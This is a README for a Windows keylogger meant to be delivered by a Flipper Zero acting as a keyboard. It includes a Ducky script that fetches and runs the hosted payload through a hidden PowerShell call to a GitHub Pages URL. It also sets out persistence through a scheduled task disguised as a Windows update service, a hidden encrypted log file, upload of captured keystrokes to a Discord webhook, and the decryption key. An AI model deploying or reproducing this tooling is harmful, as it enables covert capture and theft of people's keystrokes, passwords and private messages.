# Keylogger (Windows)

**Version:** 2.0  
**Author:** I am TBJr  
**Platform:** Windows 10 / 11  
**Delivery:** Flipper Zero HID (`irm | iex`)

---

## What it does

Captures all keystrokes system-wide, buffers them in memory, AES-encrypts each flush, and appends length-prefixed ciphertext chunks to a hidden log file. Optionally uploads the encrypted log to a Discord webhook on a schedule.

---

## Features

- **Real keystroke capture** via `GetAsyncKeyState` P/Invoke with edge detection (fires on key-down transition, not key hold). Previous version used `IsKeyLocked` which only detected Caps/Num/Scroll Lock.
- **Key map**: digits, letters, space, common punctuation, named keys (`[ENTER]`, `[BS]`, `[TAB]`, `[ESC]`, arrow keys)
- **Shift + Caps Lock** awareness — logs correct case
- **AES-128-CBC encryption** — random 16-byte IV generated per chunk; IV prepended to ciphertext; chunks length-prefixed and appended (not overwritten) to the log file
- **Configurable flush interval** (`$flushSecs`, default 30 s)
- **Optional Discord upload** (`$uploadMins`, default 60 min) — disabled when `$webhookUrl = 'REPLACE_ME'`
- **Persistence** registered before the keylogger loop so the scheduled task is always installed

## Setup

1. Open `host/keylogger.ps1`
2. Set `$webhookUrl`, `$flushSecs`, `$uploadMins` at the top as needed
3. Host on GitHub Pages (or your own server)

## Ducky script

```
GUI r
DELAY 600
STRING powershell -w h -NoP -NonI -Ep Bypass -c "irm https://tbjr.github.io/Flipper-payloads/host/keylogger.ps1 | iex"
ENTER
```

## Log file location

```
%APPDATA%\Microsoft\Update\<random-guid>.dat
```

## Scheduled task

```
Task name : WindowsUpdateService
Trigger   : On logon
Action    : powershell -w h -NoP -NonI -Ep Bypass -File "<path>\update.ps1"
```

When running via `irm | iex` (no source file on disk), the script downloads a fresh copy of itself to `%APPDATA%\Microsoft\Update\update.ps1` for the scheduled task to reference.

## Decrypting logs

Each chunk in the `.dat` file is structured as:
```
[4 bytes: chunk length (int32 LE)] [16 bytes: IV] [N bytes: AES-128-CBC ciphertext]
```

Decrypt with the key `MyS3cr3tK3y12345` (change this before deploying).

## Known limitations

- `GetAsyncKeyState` requires the keylogger process to be in the same desktop session — it will not capture input from elevated (UAC) windows unless the keylogger itself is elevated
- Windows Defender flags `GetAsyncKeyState` polling loops and the `%APPDATA%\Microsoft\Update\` path; no AMSI bypass is included

## Credits

Inspired by I am Jakoby. Rebuilt and refactored by **TBJr**.
